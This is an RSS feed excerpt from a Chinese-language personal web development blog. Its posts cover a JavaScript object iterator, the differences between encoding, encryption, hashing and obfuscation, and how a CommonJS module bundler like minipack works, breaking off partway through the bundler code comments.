<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Jeff's Blog</title>
    <description>Web development | Fitness</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Fri, 22 Mar 2019 16:15:05 +0800</pubDate>
    <lastBuildDate>Fri, 22 Mar 2019 16:15:05 +0800</lastBuildDate>
    <generator>Jekyll v3.8.5</generator>
    
      <item>
        <title>实现对象迭代器</title>
        <description>&lt;h3 id=&quot;实现一个对象迭代器&quot;&gt;实现一个对象迭代器&lt;/h3&gt;

&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;for...of&lt;/code&gt;在对象上时，js是会报错的，因为对象没有内置迭代行为。&lt;/p&gt;

&lt;p&gt;而&lt;code class=&quot;highlighter-rouge&quot;&gt;Map&lt;/code&gt; / &lt;code class=&quot;highlighter-rouge&quot;&gt;Array&lt;/code&gt;则是内置的可迭代对象，并且有默认的迭代行为。所以可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;for...of&lt;/code&gt;来迭代。&lt;/p&gt;

&lt;p&gt;为了变成可迭代对象， 一个对象必须实现 ** @@iterator &lt;strong&gt;方法, 意思是这个对象（或者它原型链 &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain&quot;&gt;prototype chain&lt;/a&gt; 上的某个对象）必须有一个名字是 &lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Symbol&lt;/code&gt;&lt;/a&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.iterator&lt;/code&gt; 的属性。
这个属性在对象需要被迭代的时候（比如用于一个&lt;code class=&quot;highlighter-rouge&quot;&gt;for..of循环中&lt;/code&gt;），它的&lt;/strong&gt;@@iterator**方法被调用，然后返回一个用于在迭代中获得值的迭代器。&lt;/p&gt;

&lt;p&gt;具体而言，这个函数不接受参数，并且会返回一个对象。这个对象中需要有一个next方法。&lt;/p&gt;

&lt;p&gt;next方法也不接受参数，并且返回一个对象，对象里有俩个值，&lt;strong&gt;done&lt;/strong&gt;和&lt;strong&gt;value&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;代码如下&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nb&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;defineProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Symbol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;undefined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//0&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;//1&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;//2&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Symbol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]();&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;//{value: 0, done: false}&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;//{value: 1, done: false}&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;//{value: 2, done: false}&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;//{value: undefined, done: true}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Fri, 12 Oct 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2018/10/12/js/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/10/12/js/</guid>
        
        <category>javascript</category>
        
        
      </item>
    
      <item>
        <title>Encoding 和 Encryption 和 Hashing 和 Obfuscation 的区别</title>
        <description>&lt;p&gt;这篇&lt;a href=&quot;https://danielmiessler.com/study/encoding-encryption-hashing-obfuscation/#encoding&quot;&gt;文章&lt;/a&gt;很好的描述了编码，加密，散列和混淆之间的区别。所以自己做一次翻译。&lt;/p&gt;

&lt;h4 id=&quot;encoding编码&quot;&gt;Encoding（编码）&lt;/h4&gt;

&lt;p&gt;编码的目的是为了转换数据的格式，以便于被正确的（并且安全的）在不同的系统中使用。例如，二进制的数据通过email来传送，或者在web页面中以特殊字符的形式查看。这个目的不是为了保证信息的安全，而是确保信息能被正确的使用。&lt;/p&gt;

&lt;p&gt;编码使用公开可用可用的方案来转换数据的格式，所以它可以轻易的反转，即反编码。&lt;/p&gt;

&lt;p&gt;常见的编码方案有&lt;strong&gt;ASSCII&lt;/strong&gt;，&lt;strong&gt;UNICODE&lt;/strong&gt;，&lt;strong&gt;URL ENCODING&lt;/strong&gt;，&lt;strong&gt;BASE64&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;encryption加密&quot;&gt;Encryption（加密）&lt;/h4&gt;

&lt;p&gt;加密的目的是为了转换数据来保证数据是保密的。例如传递一封只有某人才能读的密信，或者在网络中传递密码。目的是为了确保数据不被任何非预定的接受人所使用，而不是专注于数据的可用性。&lt;/p&gt;

&lt;p&gt;加密通过以下的方式转换数据为另一种格式，为了只有指定的人才能把数据转换回去。&lt;/p&gt;

&lt;p&gt;他通过使用一个秘钥，结合明文和算法执行加密操作。因此，解密时使用密文，加密算法和密钥来生成明文。&lt;/p&gt;

&lt;p&gt;常见的加密算法有&lt;strong&gt;AES&lt;/strong&gt;，&lt;strong&gt;BLOWFISH&lt;/strong&gt;，&lt;strong&gt;RSA&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;hashing散列&quot;&gt;Hashing（散列）&lt;/h4&gt;

&lt;p&gt;散列的目的是确保数据的完整性，这样如果数据发生变化，你可以从通过对比散列值来发现。&lt;/p&gt;

&lt;p&gt;技术上来讲，散列接受任意的输入值，产生一个具有以下属性的固定长度字符串。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;同样的输入值，总是会产生同样的输出值&lt;/li&gt;
  &lt;li&gt;多个不同的输入值不应该产生相同的输出值&lt;/li&gt;
  &lt;li&gt;无法从输出值反推算出输入值&lt;/li&gt;
  &lt;li&gt;给出的输入值只要有任何改变，都会反映的输出的hash值当中&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;散列通常结合授权来使用，用于给给定的消息一个强力的证据表明它是没有被修改的。这是通过对给定的输入值进行散列，然后使用发送方的私钥对hash值进行签名来实现（用私钥加密，生成的即为数字签名）。&lt;/p&gt;

&lt;p&gt;当接收者打开信息时，他们可以用发送者的公钥解密数字签名，得到消息的hash值。这时再对消息进行散列，把新的hash值与对方发来的hash值对比。相同则代表消息没有被修改，是完整的。&lt;/p&gt;

&lt;p&gt;常见的散列算法有&lt;strong&gt;SHA-3&lt;/strong&gt;，&lt;strong&gt;MD5&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;obfuscation混淆&quot;&gt;Obfuscation（混淆）&lt;/h4&gt;

&lt;p&gt;混淆的目的是为了让数据更难去读懂，通常是为了让数据更难被攻击或者复制。&lt;/p&gt;

&lt;p&gt;一个通用的使用场景是混淆源代码，这样逆向工程更难了。&lt;/p&gt;
</description>
        <pubDate>Thu, 11 Oct 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2018/10/11/js/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/10/11/js/</guid>
        
        <category>加密</category>
        
        
      </item>
    
      <item>
        <title>实现一个CommonJs规范的模块打包器</title>
        <description>&lt;p&gt;主要从&lt;a href=&quot;https://slides.com/lucianomammino/unbundling-the-javascript-module-bundler-dublinjs#/&quot;&gt;该PPT&lt;/a&gt;整理而来，demo为&lt;a href=&quot;https://github.com/ronami/minipack&quot;&gt;minipack&lt;/a&gt;。&lt;/p&gt;

&lt;h4 id=&quot;为什么需要前端模块化&quot;&gt;为什么需要前端模块化&lt;/h4&gt;

&lt;p&gt;原因有很多，减少http请求数，模块化开发方便解耦代码，便于组件的开发等等。&lt;/p&gt;

&lt;p&gt;但最重要的一个原因，我认为是避免了全局变量的命名冲突。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;实现方式是通过IIFE（immediately invoked function exprsstion）注入外部变量，函数内部变量不会污染全局变量&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;一个模块打包器具有哪些能力&quot;&gt;一个模块打包器具有哪些能力？&lt;/h4&gt;

&lt;p&gt;应当有&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;具有简单的 import / export 语法&lt;/li&gt;
  &lt;li&gt;模块之间可以互相引用&lt;/li&gt;
  &lt;li&gt;在不同文件内可以定义模块&lt;/li&gt;
  &lt;li&gt;模块内的内容不会影响其他模块&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;nice to have&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;解决了命名冲突&lt;/li&gt;
  &lt;li&gt;无缝支持浏览器端和服务器端&lt;/li&gt;
  &lt;li&gt;支持异步引用&lt;/li&gt;
  &lt;li&gt;支持引用模块部分内容。例如：&lt;code class=&quot;highlighter-rouge&quot;&gt;import { chain } from 'lodash'&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;目前的前端模块打包器有哪些&quot;&gt;目前的前端模块打包器有哪些？&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h5 id=&quot;commonjs&quot;&gt;CommonJs&lt;/h5&gt;

    &lt;ul&gt;
      &lt;li&gt;避免了命名冲突&lt;/li&gt;
      &lt;li&gt;npm强大的生态环境，有很多使用CommonJs规范的库&lt;/li&gt;
      &lt;li&gt;只支持同步引入模块&lt;/li&gt;
      &lt;li&gt;不支持浏览器端，只支持在node.js环境下工作&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h5 id=&quot;amdrequirejs&quot;&gt;AMD（requireJs）&lt;/h5&gt;

    &lt;ul&gt;
      &lt;li&gt;无缝支持服务端和浏览器端&lt;/li&gt;
      &lt;li&gt;支持异步模块引用&lt;/li&gt;
      &lt;li&gt;用法麻烦&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h6 id=&quot;umd-通用模块定义&quot;&gt;UMD 通用模块定义&lt;/h6&gt;

    &lt;ul&gt;
      &lt;li&gt;语法复杂&lt;/li&gt;
      &lt;li&gt;兼容AMD，CommonJs，Global等模块化形式&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h6 id=&quot;es2016-modulees6模块&quot;&gt;Es2016 module（ES6模块）&lt;/h6&gt;

    &lt;ul&gt;
      &lt;li&gt;只有部分现代浏览器支持&lt;/li&gt;
      &lt;li&gt;属于静态引用&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;模块打包器是怎么工作的&quot;&gt;模块打包器是怎么工作的&lt;/h4&gt;

&lt;p&gt;以CommonJs规范为例子，模块打包器实际上是一段运行在浏览器端的IIFE函数。&lt;/p&gt;

&lt;p&gt;他接受一个模块图（module graph）作为参数，传递到内部函数。&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;modulesMap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;exports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;modulesMap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./app'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;})(&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'./app'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;…&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'./calculator'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;…&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'./log'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;…&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'./parser'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;…&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'./resolver'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;…&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这段代码并不复杂，使用IIFE是为了避免命名冲突。传入模块图是为了同步的执行所有运行的模块。&lt;/p&gt;

&lt;h5 id=&quot;模块图是如何而来&quot;&gt;模块图是如何而来？&lt;/h5&gt;

&lt;p&gt;首先我们每一个打包好的代码，都会有一个入口模块。我们在这个入口模块中，会引用到其他模块，其他模块又会引用另外的模块。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;我们需要拿到所有引用的模块，并且知道每个模块引用了哪些模块。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;模块的引用会使用到 &lt;code class=&quot;highlighter-rouge&quot;&gt;import&lt;/code&gt;/&lt;code class=&quot;highlighter-rouge&quot;&gt;require&lt;/code&gt;语句，这里利用&lt;strong&gt;Babel&lt;/strong&gt;提供了解析AST，遍历AST的能力。&lt;/p&gt;

&lt;p&gt;我们可以拿到所有&lt;code class=&quot;highlighter-rouge&quot;&gt;import&lt;/code&gt;语句调用的参数，即模块的相对路径。&lt;/p&gt;

&lt;p&gt;解析AST =&amp;gt;&lt;/p&gt;

&lt;p&gt;遍历AST（拿到所有模块的路径）=&amp;gt;&lt;/p&gt;

&lt;p&gt;拿到所有模块的源代码（jsx，es6的转换可以在这一步做）=&amp;gt;&lt;/p&gt;

&lt;p&gt;根据使用的模块化规范，包装源代码=&amp;gt;&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//source code }&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;把所有模块的源代码维护成一个模块图，其实就是一个map。&lt;/p&gt;

&lt;p&gt;这样就生成了一个模块图。&lt;/p&gt;

&lt;p&gt;这里建议直接看&lt;strong&gt;minipack&lt;/strong&gt;的实现，代码很简单，有很多注释。&lt;/p&gt;

&lt;p&gt;贴下我修改后的minipack，添加了&lt;strong&gt;去除重复模块&lt;/strong&gt;的能力。&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// &lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 模块捆绑器 将 小块代码 编译成 更大和更复杂的代码,可以运行在Web浏览器中. &lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 这些小块只是JavaScript文件以及它们之间的依赖关系,而这正是由模块系统表示&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// https://webpack.js.org/concepts/modules&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 模块捆绑器具有 入口文件 的这种概念,而不是添加一些&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 脚本标签在浏览器中并让它们运行,我们让 捆绑器 知道&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 哪个文件 是我们应用程序的 主要文件. 该文件能引导&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 我们的整个应用程序. &lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 我们的打包程序将从该 入口文件 开始,并尝试理解&lt;/span&gt;
